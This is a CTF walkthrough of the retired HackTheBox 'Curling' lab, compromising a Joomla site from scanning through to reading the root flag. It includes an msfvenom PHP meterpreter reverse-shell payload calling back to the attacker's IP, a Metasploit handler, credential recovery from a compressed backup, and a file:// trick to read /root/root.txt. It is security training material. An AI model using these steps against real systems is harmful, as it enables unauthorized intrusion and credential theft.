@@ -1,0 +1,112 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">HacktheBox Curling Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-curling-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-04-04T06:58:51+00:00">April 4, 2019</time><time class="updated" datetime="2025-06-29T12:23:01+00:00">June 29, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to solve another CTF challenge “Curling”. It is a retired vulnerable lab presented by Hack the Box for helping </span>pentesters<span style="color: #000000;"> to perform online penetration testing according to your experience level; they have a collection of vulnerable labs as challenges, from beginners to Expert level.</span></p>
+<p><span style="color: #000000;"><strong>Level</strong>: Intermediate</span></p>
+<p><span style="color: #000000;"><strong>Task</strong>: To find user.txt and root.txt file</span></p>
+<p><span style="color: #000000;"><strong>Note</strong>: Since these labs are online available therefore they have a static IP. The IP of Curling is 10.10.10.150</span></p>
+<h3><span style="color: #800000;">Penetrating Methodology</span></h3>
+<ul>
+<li><span style="color: #000000;">Network scanning (Nmap)</span></li>
+<li><span style="color: #000000;">Surfing the IP address on the browser</span></li>
+<li><span style="color: #000000;">Finding Secret View Page Source</span></li>
+<li><span style="color: #000000;">Decoding Secret</span></li>
+<li><span style="color: #000000;">Enumerating Joomla!</span></li>
+<li><span style="color: #000000;">Creating Payload using msfvenom</span></li>
+<li><span style="color: #000000;">Getting Meterpreter Session</span></li>
+<li><span style="color: #000000;">Enumerate and Extract password files</span></li>
+<li><span style="color: #000000;">Getting SSH Session</span></li>
+<li><span style="color: #000000;">Grab User Flag</span></li>
+<li><span style="color: #000000;">Enumerate for Root Flag</span></li>
+<li><span style="color: #000000;">Getting the root flag</span></li>
+</ul>
+<h3><span style="color: #800000;">Walkthrough</span></h3>
+<p><span style="color: #000000;">Let’s start off with our basic Nmap command to find out the open ports and services.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sV -sC -T4 -p- 10.10.10.150</pre>
+<p><img decoding="async" src="//1.bp.blogspot.com/-GggnWd0ZAlw/XKWf-kxugtI/AAAAAAAAdz4/P8EPf2eLI9cd9SoGrJB2crRatAg3MsIkQCLcBGAs/s1600/1.png"/></p>
+<p><span style="color: #000000;">The Nmap scan shows 2 open ports: <strong>22(SSH), 80(HTTP)</strong></span></p>
+<p><span style="color: #000000;">As port 80 is running HTTP service, we open the IP address in the web browser.</span></p>
+<p><img decoding="async" src="//2.bp.blogspot.com/-Hvz6gsh5oLE/XKWgBgOZlnI/AAAAAAAAd0c/SKukLzu4t0ElGvtB4ZY1cbo9mjIMszBAQCLcBGAs/s1600/2.png"/></p>
+<p><span style="color: #000000;">Here, we found two usernames <strong>Floris &amp; Super User</strong>. They might come in handy later on. Let’s view the Page source of the webpage.</span></p>
+<p><img decoding="async" src="//2.bp.blogspot.com/-avDO5Upq0mE/XKWgCGan-rI/AAAAAAAAd0g/JNiSM-lXvj8kvLkQZ0xd8gghYKZEct2cACLcBGAs/s1600/3.png"/></p>
+<p><span style="color: #000000;">Let’s open the <strong>secret.txt</strong> in the browser.  It displayed a base64 encoded string.</span></p>
+<p><img decoding="async" src="//2.bp.blogspot.com/-leZykQDOb5k/XKWgC8u33DI/AAAAAAAAd0k/pyqntSpyNIYdfsjIeGfV71vseC7FWePuwCLcBGAs/s1600/4.png"/></p>
+<p><span style="color: #000000;">Time to decode this base64 encoded string. So, on decoding it we got <strong>Curling2018! </strong>This can be used as a credential.</span></p>
+<pre class="lang:default decode:true">echo "Q3VybGluZzIwMTgh" | base64 -d</pre>
+<p><img decoding="async" src="//1.bp.blogspot.com/-EwzWxxUfUwY/XKWgDYKE7pI/AAAAAAAAd0o/3EFL49TDqf4zlOElpU8wItqnxcyXlfqJwCLcBGAs/s1600/5.png"/></p>
+<p><span style="color: #000000;">Due to previous experience with<strong> Joomla!</strong> We already knew about its administrator login page. Not wasting our time we directly opened /administrator directory in the browser along with the credentials.</span></p>
+<h5><span style="color: #000000;">Username- Floris</span></h5>
+<p><span style="color: #000000;"><strong>Password- Curling2018!</strong></span></p>
+<p><img decoding="async" src="//2.bp.blogspot.com/-2mfxt-74yQM/XKWgDa_o6vI/AAAAAAAAd0s/u34YHqBy6e0a7baLZ4odGZvgeRjNJN20QCLcBGAs/s1600/6.png"/></p>
+<p><span style="color: #000000;">We have successfully logged in.</span></p>
+<p><img decoding="async" src="//3.bp.blogspot.com/-3Is-bPENCrc/XKWgDhVfz5I/AAAAAAAAd0w/RMAYrVRBovYxr1COJO7Q0-Tio988J-GqQCLcBGAs/s1600/7.png"/></p>
+<p><span style="color: #000000;">We have created a <strong>PHP shell</strong> payload using <strong>msfvenom</strong>.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.120 lport=443 -f raw</pre>
+<p><img decoding="async" src="//2.bp.blogspot.com/-5mGbZMWlt1c/XKWgD8oN6aI/AAAAAAAAd00/cQfSdHwgH18MWRu2V8UM6c4FGmVn8KfyQCLcBGAs/s1600/8.png"/></p>
+<p><span style="color: #000000;">On the other hand, we have setup listening using Metasploit-framework.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf &gt; use exploit/multi/handler
+msf exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcp
+msf exploit(multi/handler) &gt; set lhost tun0
+msf exploit(multi/handler) &gt; set lport 443
+msf exploit(multi/handler) &gt; run</pre>
+<p><img decoding="async" src="//2.bp.blogspot.com/-67XOzzhVT74/XKWgEJCfQPI/AAAAAAAAd04/Z_Bj-b23DPgYU4cIRE5ZGkCFWAunEIhrgCLcBGAs/s1600/9.png"/></p>
+<p><span style="color: #000000;">Let’s try to upload <strong>php reverse shell</strong><strong> script</strong> which we have created using <strong>msfvenom</strong>. Let’s first navigate to /template/protostar/ on the webpage.</span></p>
+<p><img decoding="async" src="//4.bp.blogspot.com/-idd864ldKII/XKWf-pMz63I/AAAAAAAAdz0/wDDwoeUhdas0InyIKPOXrP4zRSGfELlWwCLcBGAs/s1600/10.png"/></p>
+<h5><span style="color: #000000;">Finally, we have got the </span>meterpreter<span style="color: #000000;">.</span></h5>
+<p><img decoding="async" src="//2.bp.blogspot.com/-tVFNtjbukok/XKWf-fTK97I/AAAAAAAAdzw/ugJ9QuJd_P8zLU1juOucMLC75CZUIh3yQCLcBGAs/s1600/11.png"/></p>
+<p><span style="color: #000000;">We got the reverse shell, but it is not a proper shell. We will spawn a </span>tty<span style="color: #000000;"> shell using python.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">shell
+python3 -c "import pty;pty.spawn('/bin/bash')"</pre>
+<p><img decoding="async" src="//1.bp.blogspot.com/-1USMHM1t8NE/XKWf_L8yRBI/AAAAAAAAdz8/tV8SJUB7il8GqyW6Fg2Lah52EZi70qsUgCLcBGAs/s1600/12.png"/></p>
+<p><span style="color: #000000;">After enumerating through directories, we found a useful file password_backup. Let’s check </span>its<span style="color: #000000;"> contents. The contents of this file </span>look<span style="color: #000000;"> like </span>hexdump<span style="color: #000000;">.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ls -al
+cat password_backup</pre>
+<p><img decoding="async" src="//3.bp.blogspot.com/-mESC4btXeMk/XKWf_V5xDNI/AAAAAAAAd0A/TwImxC9GW74_btU98JLfjbDMnU-NO-SfgCLcBGAs/s1600/13.png"/></p>
+<p><span style="color: #000000;">Let’s use </span>an xxd<span style="color: #000000;"> tool which is used to create h</span>ex<span style="color: #000000;"> dump of the given file or standard input. On decompressing the file we saw the author of the machine has recursively compressed the password_backup file. We need to recursively decompress it.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">xxd -r password_backup &gt; password
+file password
+mv password password.bz2
+bzip2 -d password.bz2
+ls
+file password
+mv password password.gz
+gzip -d password.gz
+ls
+file password
+mv password password.bz2
+bzip2 -d password bz2
+ls
+mv password password.tar
+tar xvf password.tar
+cat password.txt</pre>
+<p><span style="color: #000000;">The content found in password.txt might be the password to login into SSH. Let’s find out if our intuition is true or not.</span></p>
+<p><img decoding="async" src="//3.bp.blogspot.com/-ctIIkEN0U1s/XKWf_tWA7XI/AAAAAAAAd0E/dSZDxMsv_go8vaYK_zTn8-pLz1N9HkS4QCLcBGAs/s1600/14.png"/></p>
+<p><span style="color: #000000;">We have successfully logged into SSH using the password found in password.txt.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh floris@10.10.10.150</pre>
+<p><span style="color: #000000;">On exploring, we found <strong>User.txt</strong> and read its contents.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ls
+cat user.txt</pre>
+<p><img decoding="async" src="//4.bp.blogspot.com/-g8mFTmOQ1-I/XKWgAYOLKrI/AAAAAAAAd0M/KvEgAbRumk8s1jKXc50h8jY4_f9HexLOgCLcBGAs/s1600/16.png"/></p>
+<p><span style="color: #000000;">On further enumerating, we found two files input &amp; report in </span>the admin-area<span style="color: #000000;"> folder. Let’s read the contents of both the files.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat input
+wc -l report</pre>
+<p><img decoding="async" src="//4.bp.blogspot.com/-ctFuwnPR8DA/XKWgAqBQ1NI/AAAAAAAAd0U/DSIuIuYXnosMc6Hn_JFYLGLJFCWB1dFFgCLcBGAs/s1600/17.png"/></p>
+<p><span style="color: #000000;">After sometime of thinking, we thought of changing the content of the input file using echo.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ls -al
+echo "file:///root/root.txt" &gt; input</pre>
+<p><img decoding="async" src="//3.bp.blogspot.com/-dMg4nwEU7bM/XKWgApN3PKI/AAAAAAAAd0Q/S3SOfQvHKYMBwifuUhj-OJe9yfw87RzSACLcBGAs/s1600/18.png"/></p>
+<p><span style="color: #000000;">It took us time to think about it. We did this because we knew our final flag is inside /root/root/txt. And also came to know the output of the input file will be saved in the report file.</span></p>
+<p><span style="color: #000000;">Now after some time when we opened the report file. We found our Final Flag and read its contents.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">wc -l report
+cat report</pre>
+<p><img decoding="async" src="//4.bp.blogspot.com/-6T65Ycio5EE/XKWgBGN4icI/AAAAAAAAd0Y/RM-M4PjrdKMvPHjmBHXJX9OGVKFZMQMZwCLcBGAs/s1600/19.png"/></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author:</strong> Ashray Gupta is a Security Researcher and Technical Writer at Hacking Articles. Contributing Years in the field of security as a Penetration Tester and Forensic Computer Analyst. Contact <a style="color: #000000;" href="https://www.linkedin.com/in/ashray-gupta-b77221b6/"><strong>Here</strong></a></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
